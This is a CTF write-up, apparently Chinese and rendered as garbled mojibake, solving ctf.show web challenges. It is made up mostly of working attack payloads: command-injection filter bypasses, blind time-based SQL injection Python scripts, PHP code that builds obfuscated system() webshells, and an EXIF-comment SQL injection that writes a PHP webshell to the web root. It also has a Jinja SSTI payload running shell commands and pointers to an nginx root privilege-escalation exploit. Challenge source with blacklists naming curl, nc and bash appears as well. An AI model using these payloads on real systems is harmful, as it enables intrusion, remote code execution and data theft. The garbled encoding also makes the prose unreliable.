$get_flag); $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag); echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;å¿«åˆ°éæ´²äº†&quot;); &#125;&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;?&gt;å»éæ´²å§ å…ˆçœ‹ç¬¬ä¸€å…³ï¼Œå¤§æ¦‚æ„æ€å°±æ˜¯ä¸¤ä¸ªæ¡ä»¶ï¼š 12intval($num)&#x3D;&#x3D;&#x3D;intval(strrev($num))$num!&#x3D;strrev($num)å¹¶ä¸”$numåªåŒ…å«0-9.- æ‰€ä»¥å¯ä»¥æ„é€  123?num&#x3D;9.-9?num&#x3D;00.0?num&#x3D;10.010 å†çœ‹ç¬¬äºŒå…³ åŒMD5ä¸æœ¬èº«å¼±ç›¸ç­‰ ç›´æ¥ç”¨0e1138100474ï¼Œæœ€åä¸€å…³å‘½ä»¤æ‰§è¡Œï¼Œå¯ä»¥ç”¨\\å’Œ%09ç»•è¿‡ï¼Œpayload: 12?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t%09&#x2F;flag?num&#x3D;10.010&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t&lt;&#x2F;flag WEB_Login_Only_For_36D_36DæŸ¥çœ‹æºç ,å‘ç°ï¼š 12&lt;!-- if (!preg_match(&#39;&#x2F;admin&#x2F;&#39;, $uname)) die; --&gt;&lt;!-- select * from 36d_user where username&#x3D;&#39;$uname&#39; and password&#x3D;&#39;$passwd&#39;; --&gt; fuzzä¸€ä¸‹ï¼Œå‘ç°è¿‡æ»¤äº† 1select &#39; &quot; | ç©ºæ ¼ ascii substr &#x3D; and mid ç«‹é©¬æƒ³åˆ°\\ï¼Œå‘ç°ä¸‹é¢å¯ä»¥å»¶æ—¶ï¼š asciiå‡½æ•°å¯ä»¥ç”¨ordå‡½æ•°ä»£æ›¿ï¼Œç­‰å·ç”¨likeï¼Œsubstrç”¨left,payload: 1username&#x3D;admin\\&amp;password&#x3D;or&#x2F;**&#x2F;if((ord(left(password,1))&#x2F;**&#x2F;like&#x2F;**&#x2F;73),sleep(3),0)# è¿˜å¯ä»¥ç”¨regexpæ³¨å…¥ï¼Œpayload: 1username&#x3D;admin\\&amp;password&#x3D;or&#x2F;**&#x2F;if((left(password,1)&#x2F;**&#x2F;regexp&#x2F;**&#x2F;binary&#x2F;**&#x2F;0x49),sleep(3),1)# exp: 123456789101112131415161718192021222324import requestsurl=&quot;http://631b5cfe-7f15-4390-958c-228c6a9c421a.chall.ctf.show&quot;flag=&#x27;&#x27;hexflag=&#x27;&#x27;s=&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;for i in range(1,50): f1=flag for j in s: hexj=str(hex(ord(j))).replace(&#x27;0x&#x27;,&#x27;&#x27;) p1=&quot;or/**/if((left(password,&#123;&#125;)/**/regexp/**/binary/**/0x&#123;&#125;),sleep(3),1)#&quot;.format(str(i),hexflag+hexj) data1=&#123;&#x27;username&#x27;:&#x27;admin\\\\&#x27;,&#x27;password&#x27;:p1&#125; try: print(i,hexj) r1=requests.post(url,data=data1,timeout=3) except requests.exceptions.ReadTimeout as e: flag+=j hexflag+=str(hex(ord(j))).replace(&#x27;0x&#x27;,&#x27;&#x27;) print(flag) break except Exception as e: pass if flag==f1: break WEBä½ å–å§36Dæ¯æºç ï¼š 123456789101112131415 &lt;?phperror_reporting(0);show_source(__FILE__);$hint=file_get_contents(&#x27;php://filter/read=convert.base64-encode/resource=hhh.php&#x27;);$code=$_REQUEST[&#x27;code&#x27;];$_=array(&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;);$blacklist = array_merge($_);foreach ($blacklist as $blacklisted) &#123; if (preg_match (&#x27;/&#x27; . $blacklisted . &#x27;/im&#x27;, $code)) &#123; die(&#x27;nonono&#x27;); &#125;&#125;eval(&quot;echo($code);&quot;);?&gt; åˆ©ç”¨é€’å¢çš„é‚£ç§æ€æƒ³æ„é€ å°±è¡Œ 123&lt;?php$_=[];$_=@&quot;$_&quot;;$_=$_[&#x27;!&#x27;==&#x27;@&#x27;];$__=$_;$_++;$_++;$_++;$_++;$_______=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$________=$_;$_++;$_++;$_++;$_++;$_++;$_++;$_________=$_;$_++;$__________=$_;$_____=$_;$_++;$_++;$_++;$_++;$_++;$___________=$_;$___.=$_________;$___.=$___________;$___.=$_________;$___.=$__________;$___.=$_______;$___.=$________;$____=&#x27;_&#x27;;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$______=$__;$__++;$____.=$__;$____.=$______;$__++;$__++;$__++;$____.=$__;$__++;$____.=$__;$_=$$____;$___($_[_]);// SYSTEM($_POST[_]); payload: 1?code&#x3D;%31%29%3b%24%5f%3d%5b%5d%3b%24%5f%3d%40%22%24%5f%22%3b%24%5f%3d%24%5f%5b%27%21%27%3d%3d%27%40%27%5d%3b%24%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3d%24%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%5f%5f%3d%27%5f%27%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%5f%5f%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%5f%5f%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%5f%2b%2b%3b%24%5f%5f%5f%5f%2e%3d%24%5f%5f%3b%24%5f%3d%24%24%5f%5f%5f%5f%3b%24%5f%5f%5f%28%24%5f%5b%5f%5d%29%3b%2f%2f POSTè¦æ‰§è¡Œçš„å‘½ä»¤å°±è¡Œï¼Œæ³¨æ„codeè¦urlç¼–ç ï¼Œå› ä¸ºç”±äºphpå­—ç¬¦ä¸²è§£æç‰¹æ€§ä¼šæŠŠ+è§£ææˆç©ºæ ¼ï¼Œé¢˜ç›®ç¯å¢ƒæ˜¯php5.6å¦‚æœæ˜¯7.xè¿˜å¯ä»¥ï¼š 12(&#x27;``````&#x27;|&#x27;%13%19%13%14%05%0D&#x27;)(&#x27;``&#x27;|`%09%04`);// system(&#x27;id&#x27;); æ„é€ systemåªéœ€ 12&lt;?phpecho urlencode(&#x27;system&#x27;^&#x27;``````&#x27;); é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨$_å˜é‡æ¥æ„é€ å­—ç¬¦ï¼Œè„šæœ¬ 123456789s=[&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;,&#x27;e&#x27;,&#x27;f&#x27;,&#x27;g&#x27;,&#x27;h&#x27;,&#x27;i&#x27;,&#x27;j&#x27;,&#x27;k&#x27;,&#x27;m&#x27;,&#x27;n&#x27;,&#x27;l&#x27;,&#x27;o&#x27;,&#x27;p&#x27;,&#x27;q&#x27;,&#x27;r&#x27;,&#x27;s&#x27;,&#x27;t&#x27;,&#x27;u&#x27;,&#x27;v&#x27;,&#x27;w&#x27;,&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;,&#x27;\\~&#x27;,&#x27;\\^&#x27;]word=&#x27;system&#x27;code=&#x27;&#x27;for j in word: if j in s: code+=&#x27;$_[&#x27;+str(s.index(j))+&#x27;].&#x27; else: code+=&quot;&#x27;&quot;+j+&quot;&#x27;&quot;+&quot;.&quot;print(code) payload: 1?code&#x3D;1);$__&#x3D;$_[18].$_[24].$_[18].$_[19].$_[4].$_[11];$___&#x3D;$_[2].$_[0].$_[19].&#39; &#39;.&#39;&#x2F;&#39;.$_[5].$_[13].$_[0].$_[6];$__($___);&#x2F;&#x2F; æœ¬é¢˜é¢„æœŸè§£æ˜¯å…ˆè¯»hint 1?code&#x3D;$&#123;$_[7].$_[8].$_[12].$_[19]&#125; base64è§£ç å¾—åˆ° 123&lt;?php$a=&quot;/phpjiami.zip\\n/hint.php&quot;;?&gt; ç„¶åæŠŠphpjiami.zipä¸‹è½½ä¸‹æ¥ï¼Œæ‰“å¼€å‘ç°1.phpæ··æ·†åŠ å¯†çš„ï¼Œå¹¶ä¸”æç¤ºæ˜¯ç»è¿‡Www.PHPJiaMi.Comç½‘ç«™åŠ å¯†çš„ï¼Œè§£å¯†è„šæœ¬ï¼Œä¹Ÿå¯ä»¥ç”¨ï¼šhttps://github.com/PikuYoake/phpjiami_decodeï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182&lt;?phpfunction decrypt($data, $key)&#123; $data_1 = &#x27;&#x27;; for ($i = 0; $i &lt; strlen($data); $i++) &#123; $ch = ord($data[$i]); if ($ch &lt; 245) &#123; if ($ch &gt; 136) &#123; $data_1 .= chr($ch / 2); &#125; else &#123; $data_1 .= $data[$i]; &#125; &#125; &#125; $data_1 = base64_decode($data_1); $key = md5($key); $j = $ctrmax = 32; $data_2 = &#x27;&#x27;; for ($i = 0; $i &lt; strlen($data_1); $i++) &#123; if ($j &lt;= 0) &#123; $j = $ctrmax; &#125; $j--; $data_2 .= $data_1[$i] ^ $key[$j]; &#125; return $data_2;&#125;function find_data($code)&#123; $code_end = strrpos($code, &#x27;?&gt;&#x27;); if (!$code_end) &#123; return &quot;&quot;; &#125; $data_start = $code_end + 2; $data = substr($code, $data_start, -46); return $data;&#125;function find_key($code)&#123; // $v1 = $v2(&#x27;bWQ1&#x27;); // $key1 = $v1(&#x27;??????&#x27;); $pos1 = strpos($code, &quot;(&#x27;&quot; . preg_quote(base64_encode(&#x27;md5&#x27;)) . &quot;&#x27;);&quot;); $pos2 = strrpos(substr($code, 0, $pos1), &#x27;$&#x27;); $pos3 = strrpos(substr($code, 0, $pos2), &#x27;$&#x27;); $var_name = substr($code, $pos3, $pos2 - $pos3 - 1); $pos4 = strpos($code, $var_name, $pos1); $pos5 = strpos($code, &quot;(&#x27;&quot;, $pos4); $pos6 = strpos($code, &quot;&#x27;)&quot;, $pos4); $key = substr($code, $pos5 + 2, $pos6 - $pos5 - 2); return $key;&#125;$input_file = $argv[1];$output_file = $argv[1] . &#x27;.decrypted.php&#x27;;$code = file_get_contents($input_file);$data = find_data($code);if (!$code) &#123; echo &#x27;æœªæ‰¾åˆ°åŠ å¯†æ•°æ®&#x27;, PHP_EOL; exit;&#125;$key = find_key($code);if (!$key) &#123; echo &#x27;æœªæ‰¾åˆ°ç§˜é’¥&#x27;, PHP_EOL; exit;&#125;$decrypted = decrypt($data, $key);$uncompressed = gzuncompress($decrypted);// ç”±äºå¯ä»¥ä¸å‹¾é€‰ä»£ç å‹ç¼©çš„é€‰é¡¹ï¼Œæ‰€ä»¥è¿™é‡Œåˆ¤æ–­ä¸€ä¸‹æ˜¯å¦è§£å‹æˆåŠŸï¼Œè§£å‹å¤±è´¥å°±æ˜¯æ²¡å‹ç¼©if ($uncompressed) &#123; $decrypted = str_rot13($uncompressed);&#125; else &#123; $decrypted = str_rot13($decrypted);&#125;file_put_contents($output_file, $decrypted);echo &#x27;è§£å¯†åæ–‡ä»¶å·²å†™å…¥åˆ° &#x27;, $output_file, PHP_EOL; è§£å¯†åå¾—åˆ°ï¼š 12345&lt;?php$ch = explode(&quot;.&quot;,&quot;hello.ass.world.er.rt.e.saucerman&quot;);$c = $ch[1].$ch[5].$ch[4]; @$c($_POST[7-1]);?&gt; èšå‰‘è¿ WEB_WUSTCTFæœ´å®æ— åRevenge_Revenge_36Dæ¯æºç ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788 &lt;?phpheader(&#x27;Content-type:text/html;charset=utf-8&#x27;);error_reporting(0);highlight_file(__file__);function isPalindrome($str)&#123; $len=strlen($str); $l=1; $k=intval($len/2)+1; for($j=0;$j&lt;$k;$j++) if (substr($str,$j,1)!=substr($str,$len-$j-1,1)) &#123; $l=0; break; &#125; if ($l==1) return true; else return false;&#125;//level 1if (isset($_GET[&#x27;num&#x27;]))&#123; $num = $_GET[&#x27;num&#x27;]; $numPositve = intval($num); $numReverse = intval(strrev($num)); if (preg_match(&#x27;/[^0-9.]/&#x27;, $num)) &#123; die(&quot;éæ´²æ¬¢è¿ä½ 1&quot;); &#125; else &#123; if ( (preg_match_all(&quot;/\\./&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\\-/&quot;, $num) &gt; 1) || (preg_match_all(&quot;/\\-/&quot;, $num)==1 &amp;&amp; !preg_match(&#x27;/^[-]/&#x27;, $num))) &#123; die(&quot;æ²¡æœ‰è¿™æ ·çš„æ•°&quot;); &#125; &#125; if ($num != $numPositve) &#123; die(&#x27;æœ€å¼€å§‹ä¸Šé¢˜æ—¶å€™å¿˜å†™äº†è¿™ä¸ªï¼Œå¯¼è‡´è¿™level 1å˜æˆäº†å¼±æ™ºï¼Œæ€ªä¸å¾—è¿™ä¹ˆå¤šäººsolve&#x27;); &#125; if ($numPositve &lt;= -999999999999999999 || $numPositve &gt;= 999999999999999999) &#123; //åœ¨64ä½ç³»ç»Ÿä¸­ intval()çš„ä¸Šé™ä¸æ˜¯2147483647 çœçœå§ die(&quot;éæ´²æ¬¢è¿ä½ 2&quot;); &#125; if( $numPositve === $numReverse &amp;&amp; !isPalindrome($num) )&#123; echo &quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;; &#125;else&#123; die(&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;); &#125;&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;//level 2if (isset($_GET[&#x27;md5&#x27;]))&#123; $md5=$_GET[&#x27;md5&#x27;]; if ($md5==md5(md5($md5))) echo &quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;; else die(&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;);&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;//get flagif (isset($_GET[&#x27;get_flag&#x27;]))&#123; $get_flag = $_GET[&#x27;get_flag&#x27;]; if(!strstr($get_flag,&quot; &quot;))&#123; $get_flag = str_ireplace(&quot;cat&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;more&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tail&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;less&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;head&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;tac&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;sort&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;nl&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;$&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;curl&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;bash&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;nc&quot;, &quot;36dCTFShow&quot;, $get_flag); $get_flag = str_ireplace(&quot;php&quot;, &quot;36dCTFShow&quot;, $get_flag); if (preg_match(&quot;/[&#x27;\\*\\&quot;[?]/&quot;, $get_flag)) &#123; die(&#x27;éé¢„æœŸä¿®å¤*2&#x27;); &#125; echo &quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;; system($get_flag); &#125;else&#123; die(&quot;å¿«åˆ°éæ´²äº†&quot;); &#125;&#125;else&#123; die(&quot;å»éæ´²å§&quot;);&#125;?&gt;å»éæ´²å§ å¯ä»¥çœ‹åˆ°ï¼š 123 &lt;?php var_dump(99999999999999999.99999999999999999==99999999999999999);// true æ„é€ payload: 12?num&#x3D;0.?num&#x3D;99999999999999999.999999999999999990 æ¥ç€ä¸€æ ·ï¼Œpayload: 1?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t%09&#96;ls&#96; payload: 1?num&#x3D;99999999999999999.999999999999999990&amp;md5&#x3D;0e1138100474&amp;get_flag&#x3D;ca\\t%09&#96;ls&#96; WEBä½ æ²¡è§è¿‡çš„æ³¨å…¥36Dæ¯æç¤ºè®¿é—®robots.txt 12User-agent: *Disallow: &#x2F;pwdreset.php æˆåŠŸé‡ç½®adminçš„å¯†ç ï¼Œç™»é™†ä¹‹åå‘ç°æ˜¯ä¸ªä¸Šä¼ ï¼Œæ¥ç€å‘ç°ä¸Šä¼ æ‰€æœ‰æ–‡ä»¶éƒ½å˜æˆ.zipäº†ï¼Œå¹¶ä¸”æœ‰æ–‡ä»¶å±æ€§ç›¸å…³ä¿¡æ¯ å‘ç°å’Œfileå‘½ä»¤è¾“å‡ºä¸€æ · æ¥ç€å°±æ˜¯EXIFå¤´æ³¨å…¥äº†ï¼Œå¯ä»¥ä½¿ç”¨exiftool 1exiftool -overwrite_original -comment=&quot;test&quot; 1.jpg å†ä¸Šä¼ å‘ç° è¯•æƒ³æœ‰å¯èƒ½å­˜åˆ°æ•°æ®åº“é‡Œï¼ŒçŒœåå°sql: 1insert into column(name, type, lineFeed) values ($filename, $filetype, $filelinefeed); å°è¯•ï¼š 1exiftool -overwrite_original -comment=&quot;test\\&quot;&#x27;);select sleep(10);&quot; 1.jpg å‘ç°æˆåŠŸå»¶æ—¶äº†ï¼Œç›´æ¥å†™ä¸€å¥è¯ 1exiftool -overwrite_original -comment&#x3D;&quot;test\\&quot;&#39;);select 0x3c3f706870206576616c28245f504f53545b315d293b into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&#39;;&quot; 1.jpg å‘ç°éƒ¨åˆ†å†…å®¹æ²¡å†™ä¸Š ä¼°è®¡æœ‰é•¿åº¦é™åˆ¶ï¼Œç”¨çŸ­æ ‡ç­¾ç¼©çŸ­é•¿åº¦ 1exiftool -overwrite_original -comment=&quot;test\\&quot;&#x27;);select 0x3c3f3d60245f504f53545b315d603b into outfile &#x27;/var/www/html/1.php&#x27;;&quot; 1.jpg hexéƒ¨åˆ†æ˜¯ï¼š 1&lt;?=`$_POST[1]`; web1ç­¾åˆ°å†…éƒ¨èµ›æŸ¥çœ‹æºç å‘ç°register.phpï¼Œå­˜åœ¨sqlæ³¨å…¥ï¼Œbanäº†ï¼š 1and | sleep ç©ºæ ¼ &amp; if ascii exp: 123456789101112131415161718192021222324252627282930313233343536373839import requestsurl=&quot;http://8d1e1a44-371c-4be6-ae98-326ebebbff39.chall.ctf.show/register.php&quot;flag=&#x27;&#x27;for i in range(1,500): f1=flag top=127 low=33 while low&lt;=top: mid=(top+low)//2 p1=&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;.format(i,mid) p2=&quot;1@1.com&#x27;/**/or/**/(case/**/when/**/ord(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;&#125;,1))=&#123;&#125;/**/then/**/benchmark(5000000,md5(0x41))/**/else/**/1/**/end)/**/or/**/&#x27;&quot;.format(i,mid) data1=&#123;&#x27;e&#x27;:p1,&#x27;u&#x27;:&#x27;test&#x27;,&#x27;p&#x27;:&#x27;1234&#x27;&#125; data2=&#123;&#x27;e&#x27;:p2,&#x27;u&#x27;:&#x27;test&#x27;,&#x27;p&#x27;:&#x27;1234&#x27;&#125; try: print(i,mid) r1=requests.post(url,data=data2,timeout=3) except requests.exceptions.ReadTimeout as e: flag+=chr(mid) print(flag) break except Exception as e: pass else: try: r2=requests.post(url,data=data1,timeout=3) except requests.exceptions.ReadTimeout as e: low=mid+1 except Exception as e: pass else: top=mid-1 if flag==f1: break# web# å¯ä»¥æ³¨å‡ºæ•°æ®åº“ï¼Œä½†æ˜¯å¥½åƒä¸èƒ½æŸ¥information_schema web03å‡ºé¢˜äººä¸æƒ³è·Ÿä½ è¯´è¯.jpgå†…éƒ¨èµ›çœ‹åˆ°åˆ€ä¸Šæœ‰caiå­—æ ·ï¼Œç›²çŒœæ˜¯ä¸€å¥è¯å¯†ç ï¼Œèšå‰‘è¿ä¸Šï¼Œæœ‰ä¸¤ä¸ªhint: 123hint1: whoami &amp;&amp; ls -l &#x2F;hint2:å¦‚ä½ ä»¬æ‰€è¯´ï¼Œææƒï¼Œçœ‹çœ‹æœåŠ¡å™¨æœ‰ä»€ä¹ˆæœåŠ¡ ps -aux 12345678910111213141516USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 1 0.0 0.0 17960 636 ? Ss 12:27 0:00 /bin/sh /usr/local/bin/docker-php-entrypointroot 11 0.0 0.0 23656 592 ? Ss 12:27 0:00 /usr/sbin/cronroot 12 0.0 0.0 4384 4 ? S 12:27 0:00 tail -F /dev/nullroot 13 0.0 0.0 133628 2036 ? Ss 12:27 0:00 php-fpm: master process (/etc/php5/fpm/php-fpm.conf)www-data 14 0.0 0.0 134104 6360 ? S 12:27 0:00 php-fpm: pool wwwwww-data 15 0.0 0.0 134120 5132 ? S 12:27 0:00 php-fpm: pool wwwroot 16 0.0 0.0 85888 1084 ? Ss 12:27 0:00 nginx: master process nginxwww-data 17 0.0 0.0 86524 1852 ? S 12:27 0:00 nginx: worker processwww-data 18 0.0 0.0 86184 1364 ? S 12:27 0:00 nginx: worker processwww-data 19 0.0 0.0 86528 2140 ? S 12:27 0:00 nginx: worker processwww-data 20 0.0 0.0 86184 1328 ? S 12:27 0:00 nginx: worker processwww-data 143 0.0 0.0 133628 7436 ? S 12:40 0:00 php-fpm: pool wwwwww-data 159 0.0 0.0 17952 2856 ? S 12:42 0:00 sh -c /bin/sh -c &quot;cd &quot;/&quot;;ps -aux;echo [S];pwd;echo [E]&quot; 2&gt;&amp;1www-data 160 0.0 0.0 17956 2848 ? S 12:42 0:00 /bin/sh -c cd /;ps -aux;echo [S];pwd;echo [E]www-data 161 0.0 0.0 15568 2116 ? R 12:42 0:00 ps -aux å‘ç°æœ‰ä¸ªæ•æ„Ÿæ–‡ä»¶/usr/local/bin/docker-php-entrypoint 12345678910111213141516#!/bin/shecho $&#123;FLAG&#125; &gt; /flagchown -R root:root /flagchmod 700 /flagunset FLAGphp5-fpm &amp;nginx &amp;/usr/sbin/crontail -F /dev/null å¹¶ä¸”nginxçš„æŸä¸ªè¿›ç¨‹æ˜¯ä»¥rootè¿è¡Œçš„ï¼Œæœäº†ä¸‹å‘ç°CVE-2016-1247 bashåå¼¹shellï¼Œå°†pocä¼ åˆ°/tmpç›®å½•ä¸‹ 1https:&#x2F;&#x2F;www.seebug.org&#x2F;vuldb&#x2F;ssvid-92538 å¦‚æœä»¥ä¸‹æŠ¥é”™ 1sed -i &quot;s/\\r//&quot; poc ç­‰ä¼šå°±å¥½äº† web2è“ç˜¦å†…éƒ¨èµ›æŸ¥çœ‹æºç æœ‰ä¸¤ä¸ªhint: 12&lt;!-- param: ctfshow --&gt;&lt;!-- key: ican --&gt; çŒœæµ‹åˆ†åˆ«æ˜¯å‚æ•°ï¼Œflask keyçš„æ„æ€ ä¼ªé€ session æ¥ç€å°±å¯ä»¥ä¼ å‚æ•°ssti,pç¥çš„payloadç›´æ¥å¯ä»¥æ‰“ï¼Œflagåœ¨ç¯å¢ƒå˜é‡é‡Œ 1234567891011?ctfshow=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;catch_warnings&#x27; %&#125; &#123;% for b in c.__init__.__globals__.values() %&#125; &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125; &#123;% if &#x27;eval&#x27; in b.keys() %&#125; &#123;&#123; b[&#x27;eval&#x27;](&#x27;__import__(&quot;os&quot;).popen(&quot;env&quot;).read()&#x27;) &#125;&#125; &#123;% endif %&#125; &#123;% endif %&#125; &#123;% endfor %&#125;&#123;% endif %&#125;&#123;% endfor %&#125; web4ä¸€è§ˆæ— ä½™_å†…éƒ¨èµ›ç›´æ¥ç»™å‡ºæºç ï¼š 123&lt;?phphighlight_file(__FILE__);?&gt; è¿™å•¥ä¹Ÿæ²¡æœ‰å•Šï¼Œçœ‹äº†çœ‹ç½‘ç«™å®¹å™¨æ˜¯nginxï¼ŒçŒœæµ‹æ˜¯ï¼šhttps://moonback1314.gitee.io/2020/05/05/Vulhub%E4%B9%8Bphp/#CVE-2019-11043 